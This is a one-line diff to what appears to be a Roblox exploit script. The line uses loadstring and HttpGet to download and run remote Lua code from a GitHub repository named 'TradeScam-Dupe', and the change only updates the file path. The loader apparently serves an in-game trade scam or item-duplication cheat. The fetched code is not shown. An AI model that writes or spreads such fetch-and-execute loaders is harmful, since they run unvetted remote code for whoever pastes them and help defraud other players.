@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lmaooa1043/TradeScam-Dupe/main/linkingdupe"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lmaooa1043/TradeScam-Dupe/main/linking.lua"))()
